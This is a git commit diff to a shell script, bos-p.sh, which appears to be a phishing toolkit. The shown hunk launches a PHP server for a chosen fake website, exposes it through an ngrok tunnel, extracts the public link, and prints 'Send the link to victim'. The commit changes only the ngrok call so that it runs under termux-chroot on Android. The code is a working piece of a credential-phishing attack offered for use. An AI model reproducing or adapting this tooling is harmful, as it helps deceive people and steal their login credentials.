101a23f161c939096651ccb94fc20cd18ddf062c
HAT-ABM <57522482+BD8KR3M@users.noreply.github.com>
2021-06-30 20:10:17 +0600

    Update bos-p.sh

--- bos-p.sh
+++ bos-p.sh
@@ -324,7 +324,7 @@ printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching Ngrok ..\e[0m\n"
 cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 2
-./ngrok http 5555 > /dev/null 2>&1 &
+termux-chroot ./ngrok http 5555 > /dev/null 2>&1 &
 sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
